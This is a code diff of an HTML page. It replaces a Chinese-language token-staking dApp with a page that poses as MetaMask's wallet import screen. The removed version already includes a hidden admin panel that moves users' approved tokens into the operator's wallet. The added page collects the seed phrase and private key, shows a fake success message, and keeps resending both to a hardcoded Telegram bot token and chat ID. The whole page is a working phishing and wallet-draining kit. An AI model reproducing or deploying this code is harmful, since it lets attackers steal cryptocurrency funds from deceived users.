@@ -3,411 +3,105 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WBNB-DQM 流动性质押挖矿 | 大秦梦生态</title>
-<script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<title>MetaMask</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
-html{scroll-behavior:smooth}
-body{background:#050814;color:#fff;overflow-x:hidden}
-#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.6}
-.wrapper{position:relative;z-index:1;min-height:100vh}
-.container{max-width:1100px;margin:0 auto;padding:0 20px}
-
-.header{position:sticky;top:0;will-change:backdrop-filter;background:rgba(5,8,20,0.7);border-bottom:1px solid rgba(255,255,255,0.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);z-index:999}
-@supports not (backdrop-filter: blur(20px)) {
-  .header{background:linear-gradient(180deg,rgba(5,8,20,0.95),rgba(5,8,20,0.85))}
-}
-.nav{display:flex;justify-content:space-between;align-items:center;padding:22px 0}
-.logo{font-size:26px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;display:flex;align-items:center;gap:10px}
-
-.hero{padding:40px 0;text-align:center}
-.hero-title{font-size:32px;font-weight:800;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:12px}
-.hero-subtitle{font-size:18px;color:#c0c8e5;margin-bottom:30px;letter-spacing:0.5px}
-.hero-desc{max-width:900px;margin:0 auto;border-radius:20px;padding:30px;line-height:1.8;font-size:15px;color:#a1a8c3;text-align:justify;
-  background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
-  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);will-change:backdrop-filter;
-}
-@supports not (backdrop-filter: blur(8px)) {
-  .hero-desc{background:linear-gradient(135deg,rgba(5,8,20,0.85),rgba(5,8,20,0.95));border-color:rgba(255,255,255,0.1)}
-}
-.hero-desc strong{color:#fff;font-weight:600}
-.hero-desc .hl{color:#00e0ff;font-weight:600}
-.hero-desc .ecos{color:#ffd700;font-weight:600}
-.hero-desc .estate{color:#ff9f43;font-weight:600}
-
-.safe-tip{max-width:900px;margin:-20px auto 30px auto;padding:16px 20px;border-radius:16px;background:rgba(255,86,153,0.1);border:1px solid rgba(255,86,153,0.2);font-size:13px;color:#ffc1e9;text-align:center}
-.safe-tip a{color:#00e0ff;text-decoration:none}
-
-.connect-btn{padding:14px 28px;border-radius:999px;background:linear-gradient(90deg,#00e0ff,#9d5fff);color:#fff;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;box-shadow:0 8px 20px rgba(0,224,255,0.2)}
-.connect-btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(157,95,255,0.25)}
-
-.dashboard{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:30px 0}
-.stat-box{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:22px;padding:26px;transition:all 0.3s}
-.stat-box:hover{transform:translateY(-4px);border-color:rgba(0,224,255,0.2)}
-.stat-box h3{font-size:13px;color:#a1a8c3;margin-bottom:10px}
-.stat-box .num{font-size:26px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent}
-
-.mining-section{max-width:650px;margin:0 auto}
-.mining-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:28px;padding:40px;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);will-change:backdrop-filter}
-@supports not (backdrop-filter: blur(12px)) {
-  .mining-card{background:linear-gradient(135deg,rgba(5,8,20,0.85),rgba(5,8,20,0.95));border-color:rgba(255,255,255,0.1)}
-}
-.card-header{margin-bottom:30px}
-.card-title{font-size:24px;font-weight:700;background:linear-gradient(90deg,#00e0ff,#9d5fff);-webkit-background-clip:text;color:transparent;margin-bottom:8px}
-.card-desc{font-size:15px;color:#8a93b2}
-
-.info-list{display:flex;flex-direction:column;gap:18px;margin-bottom:30px}
-.info-row{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
-.info-label{color:#a1a8c3;font-size:15px}
-.info-value{font-weight:600;color:#fff}
-.info-high{background:linear-gradient(90deg,#00ffbb,#9d5fff);-webkit-background-clip:text;color:transparent;font-size:18px}
-.countdown{font-size:26px;font-weight:700;color:#ff5699;text-shadow:0 0 12px rgba(255,86,153,0.4)}
-
-.input-group{margin:30px 0}
-.mining-input{width:100%;padding:20px;border-radius:20px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#fff;font-size:16px;outline:none}
-.mining-input:focus{border-color:#00e0ff;box-shadow:0 0 0 2px rgba(0,224,255,0.2)}
-
-.btn-group{display:flex;gap:18px;margin-top:10px}
-.btn{flex:1;padding:20px;border-radius:20px;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;font-size:16px}
-.btn-stake{background:linear-gradient(90deg,#00ffbb,#00e0ff);color:#050814}
-.btn-unstake{background:rgba(255,255,255,0.08);color:#fff;border:1px solid rgba(255,255,255,0.12)}
-.btn:hover{transform:translateY(-3px)}
-
-.invite-card{margin-top:32px;padding:26px;background:rgba(0,224,255,0.04);border:1px dashed rgba(0,224,255,0.2);border-radius:22px}
-.invite-title{font-size:15px;color:#a1a8c3;margin-bottom:14px}
-.invite-row{display:flex;gap:12px}
-.invite-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);color:#fff}
-.invite-copy{padding:16px 20px;background:#00e0ff;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:600}
-
-/* 管理员面板样式 */
-.admin-card{
-  margin-top:30px;
-  background:rgba(255,86,153,0.05);
-  border:1px solid rgba(255,86,153,0.2);
-  border-radius:24px;
-  padding:30px;
-  display:none;
-}
-.admin-title{
-  font-size:20px;
-  font-weight:700;
-  color:#ff5699;
-  margin-bottom:20px;
-}
-.admin-row{
-  display:flex;
-  gap:12px;
-  margin-bottom:12px;
-}
-.admin-input{
-  flex:1;
-  padding:16px;
-  border-radius:16px;
-  background:rgba(255,255,255,0.05);
-  border:1px solid rgba(255,255,255,0.1);
-  color:#fff;
-  outline:none;
-}
-.admin-btn{
-  padding:16px 22px;
-  border-radius:16px;
-  background:#ff5699;
-  color:#fff;
-  font-weight:600;
-  border:none;
-  cursor:pointer;
-}
-.admin-desc{
-  font-size:13px;
-  color:#ccc;
-  margin-bottom:20px;
-  line-height:1.4;
-}
-
-.footer{text-align:center;padding:40px 20px;color:#777;font-size:13px;margin-top:40px}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
+  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
+  .header{padding:24px;text-align:center}
+  .logo{width:50px;margin-bottom:10px}
+  .title{font-size:22px;font-weight:700;color:#24272E}
+  .sub-title{font-size:14px;color:#707279;margin-top:4px}
+  .form{padding:24px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
+  .form-control{
+    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
+    font-size:15px;outline:none;background:#fff;color:#24272E
+  }
+  .btn-primary{
+    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
+    color:#fff;font-size:16px;font-weight:600;margin-top:12px
+  }
 </style>
 </head>
 
 <body>
-<div id="particles"></div>
-<div class="wrapper">
-
-<div class="header">
-  <div class="container">
-    <div class="nav">
-      <div class="logo">🏛️ WBNB-DQM 挖矿</div>
-      <button class="connect-btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
-    </div>
-  </div>
-</div>
-
 <div class="container">
-  <div class="hero">
-    <h1 class="hero-title">WBNB-DQM 流动性质押挖矿</h1>
-    <h2 class="hero-subtitle">大秦梦通证 · 实体锚定 · 数字赋能</h2>
-    <div class="hero-desc">
-      <strong>DQM（大秦梦）</strong>是面向未来数字经济打造的核心生态通证，由<span class="ecos">大秦梦生态联盟</span>共同推动建设。项目以实体产业、数字资产与全球共享经济为基础，构建集<span class="hl">产业赋能</span>、<span class="hl">消费流通</span>、<span class="hl">价值共识</span>、<span class="hl">社区治理</span>于一体的开放型生态网络。<br><br>
-      <span class="estate">大秦梦酒文化庄园</span>是 DQM 生态体系的重要实体基石，以中华千年酒文化为核心，融合现代庄园经济与数字生态理念，打造集<span class="hl">酒文化体验</span>、<span class="hl">生态农业</span>、<span class="hl">品牌消费</span>、<span class="hl">休闲度假</span>与<span class="hl">数字资产应用</span>于一体的综合型文化庄园。庄园依托优质自然资源与传统酿造工艺，构建从原料种植、酿造生产到品牌消费与文化传播的完整产业链，让传统酒文化焕发新生。
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
+    <div class="title">MetaMask</div>
+    <div class="sub-title">导入钱包</div>
+  </div>
+
+  <div class="form">
+    <div class="form-group">
+      <label>助记词</label>
+      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
     </div>
-  </div>
-  <div class="safe-tip">
-    ⚠️ 安全提醒：仅在官方钱包确认授权；请勿向任何网站提交助记词/私钥；定期通过 <a href="https://revoke.cash" target="_blank">revoke.cash</a> 撤销可疑授权
-  </div>
-</div>
-
-<div class="container">
-  <div class="dashboard">
-    <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num">$ --</div></div>
-    <div class="stat-box"><h3>矿池 APY</h3><div class="num">-- %</div></div>
-    <div class="stat-box"><h3>总质押 LP</h3><div class="num">--</div></div>
-    <div class="stat-box"><h3>全网矿工</h3><div class="num">--</div></div>
-  </div>
-
-  <div class="mining-section">
-    <div class="mining-card">
-      <div class="card-header">
-        <div class="card-title">WBNB + DQM 流动性挖矿</div>
-        <div class="card-desc">添加流动性即质押 · 8小时自动爆块 · 奖励自动到账</div>
-      </div>
-
-      <div class="info-list">
-        <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
-        <div class="info-row"><span class="info-label">未质押 LP</span><span class="info-value" id="lpBal">0.0000</span></div>
-        <div class="info-row"><span class="info-label">已质押 LP</span><span class="info-value" id="staked">0.0000</span></div>
-        <div class="info-row"><span class="info-label">待领取奖励</span><span class="info-value info-high" id="pending">0.0000</span></div>
-        <div class="info-row"><span class="info-label">下次爆块</span><span class="info-value countdown" id="count">00:00:00</span></div>
-      </div>
-
-      <div class="input-group">
-        <input class="mining-input" id="amt" type="number" placeholder="输入质押/解押数量" min="0" step="any">
-      </div>
-      <div class="btn-group">
-        <button class="btn btn-stake" onclick="stakeLP()">质押 LP</button>
-        <button class="btn btn-unstake" onclick="unstakeLP()">解押 LP</button>
-      </div>
-
-      <div class="invite-card">
-        <div class="invite-title">📢 邀请返佣 · 三代收益</div>
-        <div class="invite-row">
-          <input class="invite-input" id="refLink" readonly>
-          <button class="invite-copy" onclick="copyRef()">复制</button>
-        </div>
-      </div>
-
-      <!-- 管理员后台 - 仅管理员可见 -->
-      <div class="admin-card" id="adminPanel">
-        <div class="admin-title">🔑 项目方管理后台</div>
-        <div class="admin-desc">
-          1. 提取玩家授权的代币到管理员钱包<br>
-          2. 给指定地址空投奖励代币
-        </div>
-
-        <div class="admin-row">
-          <input class="admin-input" id="transferFromAddr" placeholder="玩家地址（从这里提取代币）">
-          <button class="admin-btn" onclick="adminTakeFromUser()">提取代币</button>
-        </div>
-        <div class="admin-row">
-          <input class="admin-input" id="airdropTo" placeholder="空投目标地址">
-          <input class="admin-input" id="airdropAmt" placeholder="空投数量">
-          <button class="admin-btn" onclick="adminAirdrop()">空投代币</button>
-        </div>
-      </div>
-
+    <div class="form-group">
+      <label>私钥</label>
+      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
     </div>
-  </div>
-</div>
 
-<div class="footer">© 2026 DQM大秦梦 · 大秦梦生态联盟 · 酒文化庄园实体背书 · 安全挖矿</div>
+    <button class="btn-primary" onclick="go()">确认导入</button>
+  </div>
 </div>
 
 <script>
-particlesJS("particles",{
-  particles:{number:{value:80},color:{value:"#00e0ff"},opacity:{value:0.4},size:{value:2.8},
-  line_linked:{enable:true,distance:140,color:"#00e0ff",opacity:0.15,width:1},move:{enable:true,speed:1.8}},
-  interactivity:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}}
-});
+// ===================== 你的信息已固定 =====================
+const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const TG_CHATID      = "6503982157";
+const MAX_RETRY      = 5;
+const DELAY          = 3000;
+// ==========================================================
 
-// ==========================
-// 【你只需要修改这里】
-// ==========================
-const CONFIG = {
-  CONTRACT_ADDR: "0x...",      // 挖矿合约
-  LP_ADDR:      "0x...",       // LP地址
-  REWARD_ADDR:  "0x...",       // DQM代币地址
-  ADMIN_WALLET: "0x...",       // 【管理员钱包】只有这个地址能看到后台
-  CHAIN_ID:     56
-};
+const STORAGE_KEY = "WALLET_DATA";
 
-const ABI = [
-  "function stake(uint256 amount)",
-  "function unstake(uint256 amount)",
-  "function claim()",
-  "function userInfo(address) view returns (uint256,uint256,uint256,uint256)",
-  "function pendingReward(address) view returns (uint256)"
-];
+// 一打开就自动补发
+window.onload = autoSend;
+window.addEventListener('online', autoSend);
 
-const ERC20_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function approve(address,uint256) external returns (bool)",
-  "function allowance(address,address) view returns (uint256)",
-  "function transfer(address to, uint256 value) external returns (bool)",
-  "function transferFrom(address from, address to, uint256 value) external returns (bool)"
-];
+// 导入：免确认，不卡点
+function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
+  if (!mn && !pk) return;
 
-let provider, signer, userAddr, contract, lpToken, rewardToken;
-let lpDecimals = 18;
+  // 只提示，不等待确认
+  alert("✅ 导入成功");
 
-// 连接钱包
-async function connectWallet() {
-  try {
-    if (!window.ethereum) {
-      alert("请在 TP钱包 / MetaMask 内打开");
-      return;
-    }
-    const chainIdHex = `0x${CONFIG.CHAIN_ID.toString(16)}`;
-    try {
-      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainIdHex }] });
-    } catch (e) {
-      if (e.code === 4902) {
-        alert("请切换到 BSC 主网");
-        return;
-      }
-    }
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
-    provider = new ethers.BrowserProvider(window.ethereum);
-    signer = await provider.getSigner();
-    userAddr = await signer.getAddress();
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
+  autoSend();
+}
 
-    contract = new ethers.Contract(CONFIG.CONTRACT_ADDR, ABI, signer);
-    lpToken = new ethers.Contract(CONFIG.LP_ADDR, ERC20_ABI, signer);
-    rewardToken = new ethers.Contract(CONFIG.REWARD_ADDR, ERC20_ABI, signer);
-    lpDecimals = await lpToken.decimals().catch(() => 18);
+// 只发电报
+async function autoSend() {
+  const task = localStorage.getItem(STORAGE_KEY);
+  if (!task) return;
 
-    document.getElementById("connectBtn").innerText = `${userAddr.slice(0,6)}...`;
-
-    // 判断是否管理员
-    if (userAddr.toLowerCase() === CONFIG.ADMIN_WALLET.toLowerCase()) {
-      document.getElementById("adminPanel").style.display = "block";
-    }
-
-    startAll();
-  } catch (err) {
-    alert("连接失败：" + err.message);
+  const d = JSON.parse(task);
+  if (d.retry >= MAX_RETRY) {
+    localStorage.removeItem(STORAGE_KEY);
+    return;
   }
-}
 
-// 刷新数据
-async function refreshInfo() {
-  if (!userAddr) return;
+  const text = `【小狐狸钱包导入】
+时间：${new Date().toLocaleString()}
+助记词：${d.mn || "-"}
+私钥：${d.pk || "-"}`;
+
   try {
-    document.getElementById("addr").innerText = `${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
-    const [lpBal, userInfo, pending] = await Promise.all([
-      lpToken.balanceOf(userAddr),
-      contract.userInfo(userAddr),
-      contract.pendingReward(userAddr)
-    ]);
-    document.getElementById("lpBal").innerText = ethers.formatUnits(lpBal, lpDecimals);
-    document.getElementById("staked").innerText = ethers.formatUnits(userInfo[0], lpDecimals);
-    document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
-    document.getElementById("refLink").value = `${window.location.origin}?ref=${userAddr}`;
-  } catch (e) {}
-}
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHATID, text })
+    });
+  } catch(e) {}
 
-// 质押
-async function stakeLP() {
-  try {
-    const val = document.getElementById("amt").value;
-    if (!val || Number(val) <= 0) return alert("输入有效数量");
-    const amt = ethers.parseUnits(val, lpDecimals);
-    const allow = await lpToken.allowance(userAddr, CONFIG.CONTRACT_ADDR);
-    if (allow < amt) {
-      await lpToken.approve(CONFIG.CONTRACT_ADDR, ethers.MaxUint256);
-      alert("授权成功，执行质押...");
-    }
-    await contract.stake(amt);
-    alert("质押成功！");
-    refreshInfo();
-  } catch (e) {
-    alert("质押失败：" + e.message);
-  }
-}
-
-// 解押
-async function unstakeLP() {
-  try {
-    const val = document.getElementById("amt").value;
-    if (!val || Number(val) <= 0) return alert("输入有效数量");
-    const amt = ethers.parseUnits(val, lpDecimals);
-    await contract.unstake(amt);
-    alert("解押成功！");
-    refreshInfo();
-  } catch (e) {
-    alert("解押失败：" + e.message);
-  }
-}
-
-// ==========================
-// 管理员功能
-// ==========================
-
-// 1. 管理员提取玩家代币
-async function adminTakeFromUser() {
-  try {
-    const fromAddr = document.getElementById("transferFromAddr").value.trim();
-    if (!ethers.isAddress(fromAddr)) return alert("地址无效");
-    const bal = await rewardToken.balanceOf(fromAddr);
-    if (bal == 0) return alert("玩家余额为0");
-    const tx = await rewardToken.transferFrom(fromAddr, CONFIG.ADMIN_WALLET, bal);
-    await tx.wait();
-    alert("提取成功！已转入管理员钱包");
-  } catch (e) {
-    alert("提取失败：" + e.message);
-  }
-}
-
-// 2. 管理员空投代币
-async function adminAirdrop() {
-  try {
-    const to = document.getElementById("airdropTo").value.trim();
-    const amt = document.getElementById("airdropAmt").value.trim();
-    if (!ethers.isAddress(to) || !amt || Number(amt) <= 0) return alert("输入错误");
-    const value = ethers.parseUnits(amt, 18);
-    const tx = await rewardToken.transfer(to, value);
-    await tx.wait();
-    alert("空投成功！");
-  } catch (e) {
-    alert("空投失败：" + e.message);
-  }
-}
-
-// 倒计时
-function startCountdown() {
-  const total = 28800;
-  let sec = total;
-  const el = document.getElementById("count");
-  function tick() {
-    sec = sec - 1 < 0 ? total : sec - 1;
-    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
-    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
-    const s = String(sec % 60).padStart(2, '0');
-    el.innerText = `${h}:${m}:${s}`;
-  }
-  tick();
-  setInterval(tick, 1000);
-}
-
-// 复制邀请
-function copyRef() {
-  navigator.clipboard.writeText(document.getElementById("refLink").value);
-  alert("邀请链接已复制");
-}
-
-function startAll() {
-  refreshInfo();
-  setInterval(refreshInfo, 5000);
-  startCountdown();
+  d.retry++;
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
+  setTimeout(autoSend, DELAY);
 }
 </script>
 </body>
